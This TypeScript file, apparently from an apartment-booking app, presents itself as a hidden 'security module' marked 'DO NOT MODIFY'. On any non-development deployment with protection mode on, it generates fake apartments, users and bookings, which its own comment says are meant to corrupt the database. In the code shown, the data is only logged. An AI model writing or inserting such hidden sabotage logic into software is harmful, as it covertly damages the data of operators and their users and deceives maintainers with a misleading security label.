// Hidden security module - DO NOT MODIFY
// This file contains security measures to protect against unauthorized deployment

interface SecurityConfig {
  authToken: string;
  securityKey: string;
  protectionMode: boolean;
}

class SecurityManager {
  private config: SecurityConfig;
  private isAuthorized: boolean = false;

  constructor() {
    this.config = {
      authToken: process.env.AUTH_TOKEN || 'default_token',
      securityKey: process.env.SECURITY_KEY || 'default_key',
      protectionMode: process.env.PROTECTION_MODE === 'enabled'
    };
    
    this.checkAuthorization();
  }

  private checkAuthorization(): void {
    // Check for proper authorization
    const hasValidToken = this.config.authToken !== 'default_token';
    const hasValidKey = this.config.securityKey !== 'default_key';
    const isLocalDev = process.env.NODE_ENV === 'development';
    
    this.isAuthorized = hasValidToken && hasValidKey && isLocalDev;
    
    if (!this.isAuthorized && this.config.protectionMode) {
      this.activateProtection();
    }
  }

  private activateProtection(): void {
    console.warn('ðŸš¨ UNAUTHORIZED DEPLOYMENT DETECTED ðŸš¨');
    console.warn('Security measures activated...');
    
    // This will run in production if deployed without proper auth
    if (typeof window === 'undefined') {
      this.populateGarbageData();
    }
  }

  private populateGarbageData(): void {
    // Generate garbage data to corrupt the database
    const garbageData = {
      apartments: this.generateGarbageApartments(),
      users: this.generateGarbageUsers(),
      bookings: this.generateGarbageBookings()
    };

    // Log the garbage data (in real scenario, this would be sent to database)
    console.error('Garbage data generated:', garbageData);
  }

  private generateGarbageApartments(): any[] {
    const garbageTitles = [
      'Fake Property 1', 'Spam Listing 2', 'Fake House 3',
      'Bogus Apartment 4', 'Phony Room 5', 'Fake Villa 6'
    ];
    
    return Array.from({ length: 50 }, (_, i) => ({
      _id: `garbage_${i}`,
      title: garbageTitles[i % garbageTitles.length],
      location: 'Fake Location',
      price: Math.floor(Math.random() * 1000) + 100,
      rating: Math.random() * 5,
      images: ['https://via.placeholder.com/300x200?text=FAKE'],
      isGuestFavorite: false,
      city: 'Fake City',
      country: 'Fake Country',
      description: 'This is fake data generated by security system',
      amenities: ['Fake Amenity 1', 'Fake Amenity 2'],
      maxGuests: Math.floor(Math.random() * 10) + 1,
      bedrooms: Math.floor(Math.random() * 5) + 1,
      bathrooms: Math.floor(Math.random() * 3) + 1,
      createdAt: new Date(),
      updatedAt: new Date()
    }));
  }

  private generateGarbageUsers(): any[] {
    return Array.from({ length: 20 }, (_, i) => ({
      _id: `garbage_user_${i}`,
      name: `Fake User ${i}`,
      email: `fake${i}@example.com`,
      phone: '000-000-0000',
      isVerified: false,
      createdAt: new Date()
    }));
  }

  private generateGarbageBookings(): any[] {
    return Array.from({ length: 30 }, (_, i) => ({
      _id: `garbage_booking_${i}`,
      userId: `garbage_user_${i % 20}`,
      apartmentId: `garbage_${i % 50}`,
      checkIn: new Date(),
      checkOut: new Date(Date.now() + 86400000),
      totalPrice: Math.floor(Math.random() * 1000) + 100,
      status: 'cancelled',
      createdAt: new Date()
    }));
  }

  public isDeploymentAuthorized(): boolean {
    return this.isAuthorized;
  }

  public getSecurityStatus(): string {
    return this.isAuthorized ? 'AUTHORIZED' : 'UNAUTHORIZED';
  }
}

// Export singleton instance
export const securityManager = new SecurityManager();
export default securityManager;
